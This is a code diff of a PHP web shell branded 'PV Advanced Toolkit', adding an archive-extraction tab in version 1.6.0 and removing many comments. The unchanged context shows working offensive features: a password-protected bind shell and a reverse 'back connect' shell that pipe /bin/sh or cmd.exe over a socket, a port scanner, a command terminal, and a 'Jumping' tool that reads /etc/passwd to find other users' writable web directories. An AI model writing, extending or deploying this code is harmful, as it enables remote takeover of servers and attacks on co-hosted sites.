@@ -237,7 +237,6 @@ function stream_command($command) {
                 $_SESSION['running_process_pid'] = $status['pid'];
             }
             
-            // --- FIX: Release session lock to allow abort requests to be processed. ---
             session_write_close();
 
             fclose($pipes[0]);
@@ -245,10 +244,6 @@ function stream_command($command) {
             stream_set_blocking($pipes[2], false);
 
             while (true) {
-                // --- REMOVED: The check for $_SESSION['abort_process'] was removed. ---
-                // The abort mechanism now relies on an external kill signal, made
-                // possible by releasing the session lock above.
-                
                 $status = proc_get_status($process);
                 if (!$status['running']) {
                     break;
@@ -270,11 +265,6 @@ function stream_command($command) {
             fclose($pipes[1]);
             fclose($pipes[2]);
             proc_close($process);
-
-            // --- REMOVED: PID is now cleared in the abort action itself. ---
-            // Because the session is closed, this script can no longer modify
-            // the session data to clean up the PID upon normal completion.
-            // The abort action is now responsible for its own cleanup.
             return;
         }
     }
@@ -308,7 +298,6 @@ function stream_command($command) {
  * @return bool|string True on success, error message string on failure.
  */
 function reassembleFileChunks($upload_id, $original_filename, $total_chunks, $target_dir) {
-    // --- FIX: Use DIRECTORY_SEPARATOR for cross-platform compatibility.
     $temp_upload_dir = rtrim(sys_get_temp_dir(), DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . 'pv-shell-uploads';
     $chunk_dir = $temp_upload_dir . DIRECTORY_SEPARATOR . $upload_id;
     $final_path = rtrim($target_dir, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $original_filename;
@@ -319,7 +308,6 @@ function reassembleFileChunks($upload_id, $original_filename, $total_chunks, $ta
     if (!$out_handle) return "Cannot open target file for writing: " . htmlspecialchars($final_path);
 
     for ($i = 0; $i < $total_chunks; $i++) {
-        // --- FIX: Use DIRECTORY_SEPARATOR for cross-platform compatibility.
         $chunk_path = $chunk_dir . DIRECTORY_SEPARATOR . $i;
         if (!file_exists($chunk_path)) {
             fclose($out_handle);
@@ -341,16 +329,11 @@ function reassembleFileChunks($upload_id, $original_filename, $total_chunks, $ta
 }
 
 function command_exists($command) {
-    // Escapeshellarg is used to prevent command injection vulnerabilities.
     $safe_command = escapeshellarg($command);
     if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
-        // 'where' is the command to find executables on Windows.
-        // 2> NUL redirects stderr to null, so we don't get "not found" messages.
         $result = @shell_exec("where " . $safe_command . " 2> NUL");
         return !empty($result);
     } else {
-        // 'command -v' is the POSIX standard way to check if a command exists.
-        // 2>/dev/null redirects stderr to null.
         $result = @shell_exec("command -v " . $safe_command . " 2>/dev/null");
         return !empty($result);
     }
@@ -406,13 +389,11 @@ function network_start_port_bind($port, $password) {
             $shell_cmd = $is_windows ? 'cmd.exe' : '/bin/sh -i';
 
              if(function_exists('proc_open')) {
-                // --- COMPATIBILITY: Changed [] to array() for PHP < 5.4 ---
                 $descriptorspec = array(
                     0 => array("pipe", "r"),
                     1 => array("pipe", "w"),
                     2 => array("pipe", "w")
                 );
-                // --- COMPATIBILITY: Replaced ?? with isset() ternary for PHP < 7.0 ---
                 $cwd = isset($_SESSION['terminal_cwd']) ? $_SESSION['terminal_cwd'] : getcwd();
                 $process = @proc_open($shell_cmd, $descriptorspec, $pipes, $cwd);
 
@@ -494,13 +475,11 @@ function network_start_back_connect($ip, $port) {
     $shell_cmd = $is_windows ? 'cmd.exe' : '/bin/sh -i';
 
     if (function_exists('proc_open')) {
-        // --- COMPATIBILITY: Changed [] to array() for PHP < 5.4 ---
         $descriptorspec = array(
             0 => array("pipe", "r"),
             1 => array("pipe", "w"),
             2 => array("pipe", "w")
         );
-        // --- COMPATIBILITY: Replaced ?? with isset() ternary for PHP < 7.0 ---
         $cwd = isset($_SESSION['terminal_cwd']) ? $_SESSION['terminal_cwd'] : getcwd();
         $process = @proc_open($shell_cmd, $descriptorspec, $pipes, $cwd);
 
@@ -529,7 +508,6 @@ function network_start_back_connect($ip, $port) {
                             $input = @fread($sock, 4096);
                             if ($input === false || $input === '') { proc_terminate($process); break 2; }
                             @fwrite($pipes[0], $input);
-                        // --- BUG FIX: Was reading from $sock, should be $pipes[1] ---
                         } elseif ($socket_s == $pipes[1]) {
                             $output_shell = @fread($pipes[1], 4096);
                             if ($output_shell !== false && $output_shell !== '') @fwrite($sock, $output_shell);
@@ -573,7 +551,6 @@ function do_port_scan($host, $ports) {
     $host = trim($host);
     if (empty($host)) return "No host provided.";
     
-    // --- COMPATIBILITY: Changed [] to array() for PHP < 5.4 ---
     $ports_to_scan = array();
     $port_ranges = explode(',', $ports);
     foreach ($port_ranges as $range) {
@@ -656,7 +633,6 @@ function generate_breadcrumbs($path) {
              return $breadcrumbs;
         }
     } else {
-        // --- MODIFICATION: Changed name from 'root' to '/' for Linux root ---
         $breadcrumbs[] = array('name' => '/', 'path' => '/');
         $current_path_builder = '/';
         $path = ltrim($path, '/');
@@ -669,7 +645,6 @@ function generate_breadcrumbs($path) {
     $parts = explode('/', $path);
 
     foreach ($parts as $part) {
-        // --- BUG FIX: Changed 'empty($part)' to '$part === ""' to allow for folder names like "0" ---
         if ($part === '') continue;
         if (substr($current_path_builder, -1) !== '/') {
             $current_path_builder .= '/';
@@ -682,9 +657,7 @@ function generate_breadcrumbs($path) {
 }
 
 function getServerInfoDetails() {
-    // --- COMPATIBILITY: Changed [] to array() for PHP < 5.4 ---
     $info = array();
-    // --- COMPATIBILITY: Replaced all ?? with isset() ternary for PHP < 7.0 ---
     $info['Server Software'] = isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : (isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : 'N/A');
     $info['Server Name'] = isset($_SERVER['SERVER_NAME']) ? $_SERVER['SERVER_NAME'] : 'N/A';
     $info['Server Admin'] = isset($_SERVER['SERVER_ADMIN']) ? $_SERVER['SERVER_ADMIN'] : 'N/A';
@@ -808,17 +781,9 @@ function formatSizeUnits($bytes) {
     return @round($bytes / pow(1024, $i), 2) . ' ' . $units[$i];
 }
 
-// --- NEW: Jumping Feature Functions ---
-
-/**
- * Gets a list of usernames from /etc/passwd on Linux systems.
- * This is part of the "Jumping" feature.
- *
- * @return array An array of usernames or an array with an error message.
- */
+// --- Jumping Feature Functions ---
 function getJumpingUsernames() {
     $passwd_file = '/etc/passwd';
-    // --- COMPATIBILITY: Changed [] to array() for PHP < 5.4 ---
     $usernames = array();
 
     if (@is_readable($passwd_file)) {
@@ -832,7 +797,6 @@ function getJumpingUsernames() {
             if (count($parts) >= 6) {
                 $username = $parts[0];
                 $home_dir = $parts[5];
-                // Only include users with home directories like /home*/*
                 if (preg_match('#^/home[0-9]*/#', $home_dir) || $home_dir === '/home') {
                     $usernames[] = $username;
                 }
@@ -844,22 +808,13 @@ function getJumpingUsernames() {
 
     return $usernames;
 }
-
-/**
- * Scans for readable/writable public_html directories for all users.
- * This is the core logic for the "Jumping" feature.
- *
- * @return string The HTML formatted result of the scan.
- */
 function scanJumpingDirectories() {
     if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
         return '<span class="jumping-error">This feature is only available on Linux servers.</span>';
     }
 
     $usernames = getJumpingUsernames();
-    // --- COMPATIBILITY: Changed [] to array() for PHP < 5.4 ---
     $basePaths = array('/home');
-    // Check for /home1, /home2, etc.
     for ($i = 1; $i <= 10; $i++) {
         if(is_dir("/home$i")) {
             $basePaths[] = "/home$i";
@@ -875,7 +830,6 @@ function scanJumpingDirectories() {
         foreach ($basePaths as $basePath) {
             foreach ($usernames as $username) {
                 $publicHtmlPath = "$basePath/$username/public_html";
-                // Check if directory exists
                 if (@is_dir($publicHtmlPath)) {
                     $isReadable = @is_readable($publicHtmlPath);
                     $isWritable = @is_writable($publicHtmlPath);
@@ -905,6 +859,89 @@ function scanJumpingDirectories() {
     return $results_html;
 }
 
+// --- Uncompressor Feature Functions ---
+/**
+ * Uncompresses an archive file (zip, rar, tar, 7z).
+ *
+ * @param string $source The full path to the source archive file (e.g., the temp path for uploads).
+ * @param string $destination The full path to the destination directory.
+ * @param string $original_filename The original name of the file, used for extension checking.
+ * @return array A result array with 'status' and 'message'.
+ */
+function uncompress_archive($source, $destination, $original_filename) {
+    // Security: Prevent directory traversal for destination.
+    $real_base_path = realpath(__DIR__);
+    $real_dest_path = realpath($destination);
+
+    // If destination doesn't exist, its real path is false. In that case, check its parent.
+    if ($real_dest_path === false) {
+        $real_dest_path = realpath(dirname($destination));
+    }
+    
+    if ($real_dest_path === false || strpos($real_dest_path, $real_base_path) !== 0) {
+        return array('status' => 'error', 'message' => "Invalid destination path or access denied. Destination must be within the script's directory.");
+    }
+    
+    // Create destination directory if it doesn't exist
+    if (!is_dir($destination) && !@mkdir($destination, 0755, true)) {
+        return array('status' => 'error', 'message' => "Could not create destination directory '" . htmlspecialchars($destination) . "'.");
+    }
+
+    $ext = strtolower(pathinfo($original_filename, PATHINFO_EXTENSION));
+    $secondary_ext = strtolower(pathinfo(pathinfo($original_filename, PATHINFO_FILENAME), PATHINFO_EXTENSION));
+    $message = '';
+    $status = 'error';
+
+    try {
+        if ($ext === 'zip') {
+            if (class_exists('ZipArchive')) {
+                $zip = new ZipArchive;
+                if ($zip->open($source) === TRUE) {
+                    $zip->extractTo($destination);
+                    $zip->close();
+                    $message = "Successfully unzipped '" . htmlspecialchars($original_filename) . "' to '" . htmlspecialchars($destination) . "'.";
+                    $status = 'success';
+                } else { throw new Exception("Failed to open ZIP archive."); }
+            } elseif (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN' && command_exists('tar')) {
+                // Fallback for Windows: use built-in tar command which can handle .zip
+                $cmd = "tar -xf " . escapeshellarg($source) . " -C " . escapeshellarg($destination);
+                $output = execute_command_with_fallback($cmd);
+                $message = "Successfully attempted to uncompress ZIP via tar command '" . htmlspecialchars($original_filename) . "'.\n\nOutput:\n" . htmlspecialchars($output);
+                $status = 'success';
+            } else { 
+                throw new Exception("The 'ZipArchive' class is not available and no command-line fallback exists for this OS. Please enable the PHP zip extension."); 
+            }
+        } elseif ($ext === 'rar') {
+            if (command_exists('unrar')) {
+                $cmd = "unrar x -o+ " . escapeshellarg($source) . " " . escapeshellarg($destination . DIRECTORY_SEPARATOR);
+                $output = execute_command_with_fallback($cmd);
+                $message = "Successfully attempted to uncompress RAR '" . htmlspecialchars($original_filename) . "'.\n\nOutput:\n" . htmlspecialchars($output);
+                $status = 'success';
+            } else { throw new Exception("The 'unrar' command is not available on the server. Please install it."); }
+        } elseif (in_array($ext, array('gz', 'bz2')) && $secondary_ext === 'tar' || $ext === 'tar') {
+             if (class_exists('PharData')) {
+                $phar = new PharData($source);
+                $phar->extractTo($destination, null, true);
+                $message = "Successfully extracted TAR archive '" . htmlspecialchars($original_filename) . "' to '" . htmlspecialchars($destination) . "'.";
+                $status = 'success';
+             } else { throw new Exception("The 'PharData' class is not available. Please enable the PHP phar extension."); }
+        } elseif ($ext === '7z') {
+             if (command_exists('7z')) {
+                $cmd = "7z x " . escapeshellarg($source) . " -o" . escapeshellarg($destination) . " -y";
+                $output = execute_command_with_fallback($cmd);
+                $message = "Successfully attempted to uncompress 7z '" . htmlspecialchars($original_filename) . "'.\n\nOutput:\n" . htmlspecialchars($output);
+                $status = 'success';
+            } else { throw new Exception("The '7z' command is not available on the server. Please install it (p7zip-full on Debian/Ubuntu)."); }
+        } else {
+            throw new Exception("Unsupported file type: '." . htmlspecialchars($ext) . "'. Only zip, rar, tar, tar.gz, tar.bz2, and 7z are supported.");
+        }
+    } catch (Exception $e) {
+        $message = $e->getMessage();
+        $status = 'error';
+    }
+    
+    return array('status' => $status, 'message' => $message);
+}
 
 if ($authenticated && isset($_POST['ajax_action'])) {
     if (isset($_SESSION['terminal_cwd']) && is_dir($_SESSION['terminal_cwd'])) {
@@ -988,22 +1025,16 @@ if ($authenticated && isset($_POST['ajax_action'])) {
                 $pid = (int)$_SESSION['running_process_pid'];
                 $command = '';
                 if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
-                    // --- FIX: Add /T to kill child processes as well for robustness.
                     $command = "taskkill /F /T /PID " . $pid;
                 } else {
-                    // --- FIX: Use pkill to kill child processes for a more reliable abort.
-                    // This is more robust than a simple 'kill'.
                     if (command_exists('pkill')) {
-                        // Kill all children of the parent process, then kill the parent.
                         $command = "pkill -9 -P " . $pid . "; kill -9 " . $pid;
                     } else {
-                        // Fallback if pkill is not available.
                         $command = "kill -9 " . $pid;
                     }
                 }
                 execute_command_with_fallback($command);
                 unset($_SESSION['running_process_pid']);
-                // --- REMOVED: The $_SESSION['abort_process'] flag is no longer used.
                 $response = array('status' => 'success', 'message' => "Abort signal sent to PID {$pid}.");
             } else {
                 $response['message'] = 'No running process PID found in session to abort. The process may have already finished.';
@@ -1028,7 +1059,6 @@ if ($authenticated && isset($_POST['ajax_action'])) {
                 }
             }
             
-            // --- MODIFICATION: Persist breadcrumbs on chdir error ---
             if (!@chdir($fm_path)) {
                 $response['message'] = 'Could not access path: ' . htmlspecialchars($fm_path);
                 $response['path'] = htmlspecialchars($fm_path); // Return the failed path
@@ -1045,7 +1075,6 @@ if ($authenticated && isset($_POST['ajax_action'])) {
             $breadcrumbs_data = generate_breadcrumbs($realPath);
             $items = @scandir($realPath);
 
-            // --- MODIFICATION: Persist breadcrumbs on scandir error ---
             if ($items === false) {
                 $response['message'] = 'Could not read directory: ' . htmlspecialchars($realPath);
                 $response['path'] = htmlspecialchars($realPath);
@@ -1065,7 +1094,6 @@ if ($authenticated && isset($_POST['ajax_action'])) {
                 if (!@is_readable($parentPath)) $permColorParent = '#ff0000';
                 elseif (@is_writable($parentPath)) $permColorParent = '#00cc00';
 
-                // --- COMPATIBILITY: Changed [] to array() for PHP < 5.4 ---
                 $dirs[] = array(
                     'name' => '..', 'type' => 'dir', 'size' => '-',
                     'owner' => 'N/A',
@@ -1091,7 +1119,6 @@ if ($authenticated && isset($_POST['ajax_action'])) {
                     if ($owner_id !== false && $group_id !== false) {
                         $owner_data = @posix_getpwuid($owner_id);
                         $group_data = @posix_getgrgid($group_id);
-                        // --- COMPATIBILITY: Replaced ?? with isset() ternary for PHP < 7.0 ---
                         $owner_name = isset($owner_data['name']) ? $owner_data['name'] : $owner_id;
                         $group_name = isset($group_data['name']) ? $group_data['name'] : $group_id;
                         $owner_info = $owner_name . '/' . $group_name;
@@ -1299,7 +1326,6 @@ if ($authenticated && isset($_POST['ajax_action'])) {
                 break;
             }
 
-            // --- FIX: Use DIRECTORY_SEPARATOR for cross-platform compatibility.
             $temp_upload_dir = rtrim(sys_get_temp_dir(), DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . 'pv-shell-uploads';
             if (!is_dir($temp_upload_dir) && !@mkdir($temp_upload_dir, 0755, true)) {
                 $response['message'] = '[Error] Could not create temporary upload directory.';
@@ -1307,7 +1333,6 @@ if ($authenticated && isset($_POST['ajax_action'])) {
             }
 
             $upload_id = basename($_POST['upload_id']); // Sanitize
-            // --- FIX: Use DIRECTORY_SEPARATOR for cross-platform compatibility.
             $chunk_dir = $temp_upload_dir . DIRECTORY_SEPARATOR . $upload_id;
             if (!is_dir($chunk_dir) && !@mkdir($chunk_dir, 0755, true)) {
                 $response['message'] = '[Error] Could not create temporary chunk directory.';
@@ -1318,7 +1343,6 @@ if ($authenticated && isset($_POST['ajax_action'])) {
             $total_chunks = (int)$_POST['total_chunks'];
             $original_filename = basename($_POST['original_filename']); // Sanitize
 
-            // --- FIX: Use DIRECTORY_SEPARATOR for cross-platform compatibility.
             $chunk_path = $chunk_dir . DIRECTORY_SEPARATOR . $chunk_index;
             if (@move_uploaded_file($_FILES['chunk']['tmp_name'], $chunk_path)) {
                 if (($chunk_index + 1) == $total_chunks) {
@@ -1429,7 +1453,6 @@ if ($authenticated && isset($_POST['ajax_action'])) {
             break;
 
         case 'network_tool':
-            // --- COMPATIBILITY: Replaced all ?? with isset() ternary for PHP < 7.0 ---
             $sub_action = isset($_POST['sub_action']) ? $_POST['sub_action'] : 'none';
             $output = '[Error] Invalid network action or parameters.';
             $host_param_host = isset($_POST['host']) ? $_POST['host'] : (isset($_POST['ip']) ? $_POST['ip'] : '');
@@ -1478,10 +1501,76 @@ if ($authenticated && isset($_POST['ajax_action'])) {
             $response = array('status' => 'success', 'output' => $output);
             break;
         
-        // --- NEW: Jumping Feature AJAX Action ---
         case 'jumping_scan':
             $scan_results = scanJumpingDirectories();
             $response = array('status' => 'success', 'output' => $scan_results);
+            break;
+        
+        case 'uncompress_file':
+            $final_source = '';
+            $original_filename = '';
+            $temp_source_to_delete = null; // To keep track of any file we create that needs manual deletion.
+            $upload_error_code = isset($_FILES['compressed_file']) ? $_FILES['compressed_file']['error'] : UPLOAD_ERR_NO_FILE;
+            
+            // Default response
+            $response = array('status' => 'error', 'message' => 'Please either upload a file or specify a valid local file path.');
+
+            if (isset($_POST['local_file']) && !empty(trim($_POST['local_file']))) {
+                $source_file_path = trim($_POST['local_file']);
+                $real_base_path = realpath(__DIR__);
+                $real_user_path = realpath($source_file_path);
+
+                if ($real_user_path === false || strpos($real_user_path, $real_base_path) !== 0) {
+                    $response['message'] = "Invalid path or access denied. You can only specify files within the script's directory.";
+                } elseif (!is_readable($real_user_path)) {
+                    $response['message'] = "File '" . htmlspecialchars($source_file_path) . "' is not readable.";
+                } else {
+                    $final_source = $real_user_path;
+                    $original_filename = basename($final_source);
+                }
+            } elseif ($upload_error_code === UPLOAD_ERR_OK) {
+                $original_filename = $_FILES['compressed_file']['name'];
+                $uploaded_tmp_path = $_FILES['compressed_file']['tmp_name'];
+                
+                $ext = strtolower(pathinfo($original_filename, PATHINFO_EXTENSION));
+                $secondary_ext = strtolower(pathinfo(pathinfo($original_filename, PATHINFO_FILENAME), PATHINFO_EXTENSION));
+
+                // Fix for PharData on Linux uploads, which requires a file with the correct extension.
+                if (strtoupper(substr(PHP_OS, 0, 3)) !== 'WIN' && ((in_array($ext, array('gz', 'bz2')) && $secondary_ext === 'tar') || $ext === 'tar')) {
+                    $new_temp_path = rtrim(sys_get_temp_dir(), DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . uniqid('phar-temp_') . '_' . basename($original_filename);
+                    if (move_uploaded_file($uploaded_tmp_path, $new_temp_path)) {
+                        $final_source = $new_temp_path;
+                        $temp_source_to_delete = $new_temp_path; // Mark this new file for deletion
+                    } else {
+                         $response['message'] = 'Could not move uploaded file to a temporary location for processing.';
+                         $final_source = ''; // Prevent further processing
+                    }
+                } else {
+                    // For ZIP, RAR, 7z, and TAR on Windows, the original temp file is fine.
+                    // PHP will clean this temp file up automatically after the script ends.
+                    $final_source = $uploaded_tmp_path;
+                }
+            } elseif ($upload_error_code !== UPLOAD_ERR_NO_FILE) {
+                $upload_errors = array(
+                    UPLOAD_ERR_INI_SIZE   => 'The uploaded file exceeds the upload_max_filesize directive in php.ini.',
+                    UPLOAD_ERR_FORM_SIZE  => 'The uploaded file exceeds the MAX_FILE_SIZE directive that was specified in the HTML form.',
+                    UPLOAD_ERR_PARTIAL    => 'The uploaded file was only partially uploaded.',
+                    UPLOAD_ERR_NO_TMP_DIR => 'Missing a temporary folder.',
+                    UPLOAD_ERR_CANT_WRITE => 'Failed to write file to disk.',
+                    UPLOAD_ERR_EXTENSION  => 'A PHP extension stopped the file upload.',
+                );
+                $response['message'] = isset($upload_errors[$upload_error_code]) ? $upload_errors[$upload_error_code] : 'Unknown upload error. Code: ' . $upload_error_code;
+            }
+
+            if ($final_source && $original_filename) {
+                $destination = isset($_POST['destination']) && !empty($_POST['destination']) ? rtrim($_POST['destination'], '/\\') : '.';
+                $response = uncompress_archive($final_source, $destination, $original_filename);
+                
+                // Clean up our manually created temporary file, if it exists.
+                if ($temp_source_to_delete && is_file($temp_source_to_delete)) {
+                    @unlink($temp_source_to_delete);
+                }
+            }
             break;
 
         default:
@@ -1541,7 +1630,7 @@ endif;
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Advanced Toolkit v1.5.0</title>
+    <title>Advanced Toolkit v1.6.0</title>
     <link rel="icon" href="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI+PHBhdGggZmlsbD0iIzBmZiIgZD0iTTEyIDJDNi40NzcgMiAyIDYuNDc3IDIgMTJzNC40NzcgMTAgMTAgMTAgMTAtNC40NzcgMTAtMTBTMTcuNTIzIDIgMTIgMnptMCAxOGMtNC40MTEgMC04LTMuNTg5LTgtOHMzLjU4OS04IDgtOCA4IDMuNTg5IDggOC0zLjU4OSA4LTggOHpNODUuNSAxMC41Yy44MjggMCAxLjUuNjcyIDEuNSAxLjVzLS42NzIgMS41LTEuNSAxLjVNNyAxMi44MjggNyAxMnMuNjcyLTEuNSAxLjUtMS41em03IDBjLjgyOCAwIDEuNS42NzIgMS41IDEuNXMwLS42NzIgMS41LTEuNSAxLjVTMTQgMTIuODI4IDE0IDEyczAuNjcyLTEuNSAxLjUtMS41em0tMy41IDRjLTIuMzMxIDAtNC4zMS0xLjQ2NS01LjExNi0zLjVoMTAuMjMyQzE2LjMxIDE2LjAzNSAxNC4zMzEgMTcuNSAxMiAxNy41eiIvPjwvc3ZnPg==">
     <link href="https://fonts.googleapis.com/css2?family=Orbitron&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
@@ -1629,18 +1718,28 @@ endif;
         .upload-progress-bar { background-color: #0ff; height: 15px; border-radius: 3px; width: 0%; transition: width 0.2s ease-out; }
         .upload-progress-info { font-size: 0.8em; margin-top: 3px; display: flex; justify-content: space-between; }
         .upload-progress-info .status { color: #0cc; }
-        /* --- NEW: Jumping Tab Styles --- */
+        /* --- Jumping Tab Styles --- */
         #jumping-results { background: #000; color: #fff; padding: 15px; min-height: 200px; max-height: 350px; overflow-y: scroll; border: 1px solid #055; margin-top: 20px; white-space: pre-wrap; font-family: 'Consolas', 'Monaco', monospace; font-size: 0.9em; border-radius: 5px; }
         #jumping-results:empty::before { content: "Scan results will appear here..."; color: #555; }
-        .jumping-writable { color: #00ff00; } /* Bright green for writable */
-        .jumping-readable { color: #ffffff; } /* White for readable */
-        .jumping-error { color: #ff4444; } /* Red for errors */
+        .jumping-writable { color: #00ff00; } .jumping-readable { color: #ffffff; } .jumping-error { color: #ff4444; }
+        /* --- Uncompressor Styles --- */
+        .uncompressor-sub-tabs { display: flex; gap: 10px; margin-bottom: 15px; }
+        .uncompressor-sub-tab { padding: 8px 12px; cursor: pointer; border: 1px solid #077; background: #222; color: #0aa; border-radius: 5px; }
+        .uncompressor-sub-tab:hover, .uncompressor-sub-tab.active { background: #000; color: #0ff; border-color: #0ff; }
+        .uncompressor-sub-content { display: none; } .uncompressor-sub-content.active { display: block; }
+        #uncompressor-results { background: #000; color: #fff; padding: 15px; min-height: 100px; max-height: 300px; overflow-y: scroll; border: 1px solid #055; margin-top: 20px; white-space: pre-wrap; font-family: 'Consolas', 'Monaco', monospace; font-size: 0.9em; border-radius: 5px; }
+        #uncompressor-results:empty::before { content: "Extraction results will appear here..."; color: #555; }
+        #uncompressor-results .success { color: #0f0; } #uncompressor-results .error { color: #f00; }
+        #uncompressor-form .input-group { margin-bottom: 15px; }
+        #uncompressor-form label { display: block; margin-bottom: 5px; color: #0cc; }
+        #uncompressor-form .inputz { width: 100%; box-sizing: border-box; }
+        #uncompressor-form small { font-size: 0.8em; color: #888; display: block; margin-top: 5px; }
     </style>
 </head>
 <body>
     <div class="container">
         <header>
-            <h1>💀 PV Advanced Toolkit v1.5.0</h1>
+            <h1>💀 PV Advanced Toolkit v1.6.0</h1>
             <form method="post" class="logout-form">
                 <input type="hidden" name="action" value="logout">
                 <button type="submit">Logout</button>
@@ -1649,6 +1748,7 @@ endif;
         <div class="tabs">
             <span class="tab-link active" data-tab="terminal">Terminal</span>
             <span class="tab-link" data-tab="filemanager">File Manager</span>
+            <span class="tab-link" data-tab="uncompressor">Uncompressor</span>
             <span class="tab-link" data-tab="jumping">Jumping</span>
             <span class="tab-link" data-tab="serverinfo">Server Info</span>
             <span class="tab-link" data-tab="network">Network Tools</span>
@@ -1658,7 +1758,6 @@ endif;
 
         <div id="terminal" class="tab-content active">
             <div id="terminal-output"></div>
-            <!-- === NEW: Wrapper for input and abort button === -->
             <div id="command-input-wrapper">
                 <input type="text" id="command-input" placeholder="Enter command..." autocomplete="off">
                 <button id="terminal-abort-btn" class="inputzbut hidden" style="background-color: #ff4444;" title="Terminate running command (SIGKILL)">Abort</button>
@@ -1668,10 +1767,7 @@ endif;
         <div id="filemanager" class="tab-content">
             <div id="file-manager-path-container">
                 <div id="drive-list"></div>
-                <div id="file-manager-path">
-                    <!-- Breadcrumbs will be generated here by JS -->
-                </div>
-                <!-- === NEW: Path Bar Navigation === -->
+                <div id="file-manager-path"></div>
                 <div id="file-manager-path-bar-container" style="margin-top: 10px; display: flex;">
                     <input type="text" id="file-manager-path-input" class="inputz" style="flex-grow: 1; margin-right: 5px;" placeholder="Enter path and click GO">
                     <button id="file-manager-go-btn" class="inputzbut">GO</button>
@@ -1698,7 +1794,6 @@ endif;
                     </div>
                 </div>
             </div>
-            <!-- === NEW: Upload Modal === -->
             <div id="upload-modal">
                 <div>
                     <h3 id="upload-modal-title">File Upload Progress</h3>
@@ -1710,7 +1805,49 @@ endif;
             </div>
         </div>
 
-        <!-- === NEW: Jumping Tab Content === -->
+        <div id="uncompressor" class="tab-content">
+            <h2>Uncompressor Tool</h2>
+            <p>Extract compressed files (.zip, .rar, .tar, .7z) on your server.</p>
+            
+            <div class="uncompressor-sub-tabs">
+                <button class="uncompressor-sub-tab active" data-subtab="uncompressor-upload">Upload File</button>
+                <button class="uncompressor-sub-tab" data-subtab="uncompressor-local">From Server Path</button>
+            </div>
+
+            <form id="uncompressor-form" enctype="multipart/form-data">
+                <div id="uncompressor-upload" class="uncompressor-sub-content active">
+                    <div class="input-group">
+                        <label for="uncompressor-file-input">Compressed File:</label>
+                        <input type="file" name="compressed_file" id="uncompressor-file-input" class="inputz" style="padding: 4px;">
+                        <small>Max file size: <?php echo ini_get('upload_max_filesize'); ?></small>
+                    </div>
+                </div>
+                <div id="uncompressor-local" class="uncompressor-sub-content">
+                    <div class="input-group">
+                        <label for="uncompressor-local-path">Local File Path:</label>
+                        <input type="text" name="local_file" id="uncompressor-local-path" class="inputz" placeholder="e.g., 'archive.zip' or 'backups/file.tar.gz'">
+                        <small>Path is relative to this script. Must be within the script's directory.</small>
+                    </div>
+                </div>
+                <div class="input-group">
+                    <label for="uncompressor-destination">Destination Directory (optional):</label>
+                    <input type="text" name="destination" id="uncompressor-destination" class="inputz" placeholder="e.g., 'extracted_files' (defaults to current dir)">
+                    <small>If blank, files extract to the same directory as this script. Must be within the script's directory.</small>
+                </div>
+                <button type="submit" class="inputzbut">Uncompress File</button>
+            </form>
+            
+            <div id="uncompressor-results"></div>
+
+            <h3 style="margin-top: 25px; border-bottom: 1px solid #055; padding-bottom: 5px;">Server Requirements Check</h3>
+            <table class="info-table" style="margin-top: 10px;">
+                <tr><td>Zip Support (ZipArchive)</td><td><?php echo class_exists('ZipArchive') ? '<span style="color:lime;">Enabled</span>' : '<span style="color:red;">Disabled</span>'; ?></td></tr>
+                <tr><td>Tar Support (PharData)</td><td><?php echo class_exists('PharData') ? '<span style="color:lime;">Enabled</span>' : '<span style="color:red;">Disabled</span>'; ?></td></tr>
+                <tr><td>Rar Command-line Tool</td><td><?php echo command_exists('unrar') ? '<span style="color:lime;">Available</span>' : '<span style="color:orange;">Not Found</span>'; ?></td></tr>
+                <tr><td>7z Command-line Tool</td><td><?php echo command_exists('7z') ? '<span style="color:lime;">Available</span>' : '<span style="color:orange;">Not Found</span>'; ?></td></tr>
+            </table>
+        </div>
+
         <div id="jumping" class="tab-content">
             <h2>Jumping - Permissions Scanner</h2>
             <p>This tool scans for misconfigured `public_html` directories of other users on the server. It checks for readable and writable paths. This feature is intended for Linux servers only.</p>
@@ -1783,7 +1920,7 @@ endif;
                     <img src="https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExNjZwdGpicmw2bmZwcHpmcDg1ZGZuZ2t5cWh1cGI0Y2lzdDB6aGh0ZCZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9cw/xxlo1yG0pvhJqNhhtj/giphy.gif" alt="Toolkit GIF" style="width: 200px; height: 200px; margin-right: 20px; border-radius: 5px; flex-shrink: 0;">
                     <div style="flex-grow: 1;">
                         <h2>About PV Advanced Toolkit</h2>
-                        <p><strong>Version:</strong> 1.5.0</p>
+                        <p><strong>Version:</strong> 1.6.0</p>
                         <p>This toolkit is a comprehensive PHP-based web shell and server management interface, designed for server administrators and security professionals for system inspection, management, and basic network operations.</p>
                     </div>
                 </div>
@@ -1856,7 +1993,14 @@ document.addEventListener('DOMContentLoaded', function() {
     const closeUploadModalBtn = document.getElementById('close-upload-modal-btn');
     const startJumpingScanBtn = document.getElementById('start-jumping-scan-btn');
     const jumpingResultsDiv = document.getElementById('jumping-results');
-    
+    const uncompressorForm = document.getElementById('uncompressor-form');
+    const uncompressorResults = document.getElementById('uncompressor-results');
+    const uncompressorSubTabs = document.querySelectorAll('.uncompressor-sub-tab');
+    const uncompressorSubContents = document.querySelectorAll('.uncompressor-sub-content');
+    const uncompressorFileInput = document.getElementById('uncompressor-file-input');
+    const uncompressorLocalPathInput = document.getElementById('uncompressor-local-path');
+
+
     // --- State Variables ---
     const scriptHomeDirectory = '<?php echo addslashes(htmlspecialchars(getcwd())); ?>';
     const initialFileManagerPath = '<?php echo addslashes(htmlspecialchars($fileManagerInitialPath)); ?>';
